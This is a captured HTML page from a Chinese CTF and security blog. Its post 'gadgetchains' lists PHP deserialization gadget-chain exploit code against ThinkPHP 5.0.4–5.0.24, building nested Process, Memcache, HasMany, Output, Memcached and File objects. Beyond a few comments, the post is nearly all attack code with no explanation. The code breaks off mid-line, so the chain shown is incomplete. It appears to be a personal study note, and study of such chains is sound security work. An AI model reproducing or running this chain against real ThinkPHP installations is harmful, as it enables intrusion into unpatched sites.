@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <meta charset="utf-8">
+    
+    <title>gadgetchains | npC4t&#39;s Blog</title>
+    
+    
+        <meta name="keywords" content="php反序列化" />
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 thinkphp 5.0.4~5.0.24123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gadgetchains">
+<meta property="og:url" content="https://123-prog.github.io/2021/09/26/gadgetchains/index.html">
+<meta property="og:site_name" content="npC4t&#39;s Blog">
+<meta property="og:description" content="0x01 thinkphp 5.0.4~5.0.24123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-09-26T09:23:46.000Z">
+<meta property="article:modified_time" content="2021-09-26T09:39:06.138Z">
+<meta property="article:author" content="npC4t">
+<meta property="article:tag" content="php反序列化">
+<meta name="twitter:card" content="summary">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="npC4t&#39;s Blog" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="/favicon.ico" />
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">npC4t&#39;s Blog</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search" />
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id='categories'>
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id='allExpand' href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            CTF
+                        </a>
+                         <ul class="unstyled" id="tree" > 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Nodejs
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/14/%E8%99%8E%E7%AC%A6CTF-2021-Internal-System/">虎符CTF 2021 Internal System</a></li>  <li class="file"><a href="/2021/07/22/buuoj-NodeProxy/">buuoj NodeProxy</a></li>  <li class="file"><a href="/2021/09/01/2021%E7%A5%A5%E4%BA%91%E6%9D%AF-cralwer-z/">(2021祥云杯)cralwer_z</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            golang web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/29/JMCTF-2021-GoOSS/">(JMCTF 2021)GoOSS</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            java web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/04/04/VNCTF-2021-realezjvav/">VNCTF 2021 realezjvav</a></li>  <li class="file"><a href="/2021/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-A-Piece-Of-Java/">(羊城杯 2020)A Piece Of Java</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            nosql
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/08/18/GKCTF-2021-hackme/">(GKCTF 2021)hackme</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            other
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Http/">极客大挑战 2019 Http</a></li>  <li class="file"><a href="/2021/09/17/RCTF2021-VerySafe/">(RCTF2021)VerySafe</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            php代码审计
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/14/HCTF-2018-Warmup/">HCTF 2018 Warmup</a></li>  <li class="file"><a href="/2021/01/20/BJDCTF2020-Easy-MD5/">BJDCTF2020 Easy MD5</a></li>  <li class="file"><a href="/2021/02/03/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-PHP/">极客大挑战 2019 PHP</a></li>  <li class="file"><a href="/2021/03/10/RoarCTF-2019-Easy-Calc/">(RoarCTF 2019) Easy Calc</a></li>  <li class="file"><a href="/2021/03/10/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/">GXYCTF2019 禁止套娃</a></li>  <li class="file"><a href="/2021/07/18/TCTF-0CTF-1linephp/">TCTF-0CTF 1linephp</a></li>  <li class="file"><a href="/2021/09/16/RCTF2021-Easyphp/">(RCTF2021) Easyphp</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            php反序列化
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/24/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-easy-serialize-php/">安洵杯 2019 easy_serialize_php</a></li>  <li class="file"><a href="/2021/04/05/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">(网鼎杯 2018)Fakebook</a></li>  <li class="file"><a href="/2021/05/05/%E8%93%9D%E5%B8%BD%E6%9D%AF-One-Pointer-PHP/">蓝帽杯-One Pointer PHP</a></li>  <li class="file"><a href="/2021/07/07/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF-2021-EasyTP/">红明谷CTF 2021 EasyTP</a></li>  <li class="file"><a href="/2021/07/27/HFCTF-2021-Final-tinypng/">(HFCTF 2021 Final)tinypng</a></li>  <li class="file"><a href="/2021/07/30/HMBCTF-2021-EzLight/">(HMBCTF 2021)EzLight</a></li>  <li class="file"><a href="/2021/08/05/CISCN2021-Quals-filter/">(CISCN2021 Quals)filter</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            python web
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/07/24/HFCTF-2021-Final-easyflask/">(HFCTF 2021 Final)easyflask</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            sql注入
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/01/15/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL/">极客大挑战 2019 BabySQL</a></li>  <li class="file"><a href="/2021/01/16/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World/">CISCN2019 华北赛区 Day2 Web1 Hack World</a></li>  <li class="file"><a href="/2021/02/11/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5/">无列名注入</a></li>  <li class="file"><a href="/2021/07/28/HFCTF-2021-Final-hatenum/">(HFCTF 2021 Final)hatenum</a></li>  <li class="file"><a href="/2021/09/18/RCTF2021-ns-shaft-sql/">(RCTF2021)ns_shaft_sql</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            文件上传
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/06/01/ciscn2021-upload/">ciscn2021 upload</a></li>  <li class="file"><a href="/2021/07/29/JMCTF-2021-UploadHub/">(JMCTF 2021)UploadHub</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            wp
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/08/HGAME-week1-web%E9%83%A8%E5%88%86/">HGAME week1 web部分</a></li>  <li class="file"><a href="/2021/04/07/DASCTF-%E4%B8%89%E6%9C%88%E8%B5%9B-web%E9%A2%98%E5%A4%8D%E7%8E%B0/">DASCTF 三月赛 web题复现</a></li>  <li class="file"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86wp/">CISCN 2021 web 部分wp</a></li>  <li class="file"><a href="/2021/08/01/DAS-x-CBCTF-%E9%83%A8%E5%88%86web-wp/">DAS x CBCTF 部分web wp</a></li>  <li class="file"><a href="/2021/08/09/GKCTFxDASCTF-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">GKCTFxDASCTF web部分复现</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            其他
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81-WebSecurityAcademy%E5%AE%9E%E9%AA%8C%E5%AE%A4/">WebSecurityAcademy实验室-Http请求走私</a></li>  <li class="file"><a href="/2021/02/12/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">Http请求走私（smuggling)学习记录</a></li>  <li class="file"><a href="/2021/04/27/SSRF%E4%B9%8Bgopher%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8/">SSRF之gopher协议利用</a></li>  <li class="file"><a href="/2021/06/22/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Java 反序列化</a></li>  <li class="file"><a href="/2021/07/23/flask-session%E9%97%AE%E9%A2%98/">flask session问题</a></li>  <li class="file"><a href="/2021/07/24/pickle-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pickle 反序列化</a></li>  <li class="file active"><a href="/2021/09/26/gadgetchains/">gadgetchains</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            原型链污染
+                        </a>
+                         <ul class="unstyled" id="tree" >  <li class="file"><a href="/2021/10/03/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">nodejs原型链污染</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/2021/01/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"></a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title"><span>archives</span></h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">October 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a><span class="archive-list-count">6</span></li></ul>
+        </div>
+    </div>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-gadgetchains" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/%E5%85%B6%E4%BB%96/">其他</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/2021/09/26/gadgetchains/">
+            <time datetime="2021-09-26T09:23:46.000Z" itemprop="datePublished">2021-09-26</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/raw/writing/source/_posts/gadgetchains.md'> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/edit/writing/source/_posts/gadgetchains.md'> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="noopener" href='https://github.com/zthxxx/Wiki-site/commits/writing/source/_posts/gadgetchains.md'> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            gadgetchains
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-thinkphp-5-0-4-5-0-24"><span class="toc-number">1.</span> <span class="toc-text">0x01 thinkphp 5.0.4~5.0.24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%BE%85%E7%BB%AD%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">2.</span> <span class="toc-text">0x02 待续。。。</span></a></li></ol>
+                </div>
+            
+        
+        
+            <h3 id="0x01-thinkphp-5-0-4-5-0-24"><a href="#0x01-thinkphp-5-0-4-5-0-24" class="headerlink" title="0x01 thinkphp 5.0.4~5.0.24"></a>0x01 thinkphp 5.0.4~5.0.24</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Process</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$status</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processPipes</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processInformation</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processInformation[<span class="string">&#x27;running&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;status = <span class="string">&#x27;starte&#x27;</span>;  <span class="comment">//started,不同就行</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;processPipes = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasMany</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> HasMany();  <span class="comment">//close()</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Model</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;     //为了满足跳板的条件而构建</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Merge</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Relation</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Query</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Merge</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">HasMany</span> <span class="keyword">extends</span> <span class="title">Relation</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$localKey</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$foreignKey</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pivot</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Output();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Merge();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span>&#123;   <span class="comment">//找到链入口，_call</span></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;styles = [<span class="string">&#x27;where&#x27;</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached(); <span class="comment">//$handle-&gt;think\session\driver\Memcached</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="keyword">new</span> File(); <span class="comment">//$handle-&gt;think\cache\driver\File</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">cache</span>\<span 